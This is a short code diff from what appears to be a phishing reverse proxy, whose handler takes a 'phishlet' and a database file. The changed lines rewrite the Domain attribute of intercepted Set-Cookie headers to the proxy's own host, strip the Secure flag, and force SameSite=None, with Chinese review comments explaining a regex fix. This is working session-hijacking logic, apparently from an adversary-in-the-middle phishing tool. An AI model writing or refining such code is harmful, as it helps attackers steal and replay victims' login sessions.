@@ -169,10 +169,11 @@ def make_handler(phishlet, db_file):
             if any(k.lower() == 'set-cookie' for k in headers):  # CS73-F4: 门同大小写不敏感
                 raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS72-7: 大小写不敏感(同 ct)
                 if isinstance(raw, str):
-                    # R32D91-OBS-A: 先剥 origin 自带 :port 尾巴再匹配(Domain 属性不
-                    # 含端口; 此前 origin 带 :8443 时重写不中且尾巴存活)。
-                    raw = re.sub(r'(?i)(domain=)[^;]+?(?::\d+)?(?=;|$)',
-                                 lambda m: 'Domain=' + (proxy_host.rpartition(':')[0] or proxy_host), raw) if 'domain=' in raw.lower() else raw
+                    # R32D91-OBS-A/CS75-F3: 剥 origin :port 尾并重写为 proxy
+                    # 域——锚定属性边界(?:^|;\s*)防 somedomain= 误中(F-3 实证),
+                    # 保留原属性名大小写; re.sub 无匹配原样返回无需预检(F-4)。
+                    raw = re.sub(r'(?i)(?:(?<=^)|(?<=;\s))([Dd]omain=)[^;]*(?::\d+)?',
+                                 lambda m: m.group(1) + (proxy_host.rpartition(':')[0] or proxy_host), raw)  # CS75-F3: 唯一捕获组=属性名
                     raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
                     raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
                     # R32D90-F1: 先删异大小写原键再设规范键——此前直赋
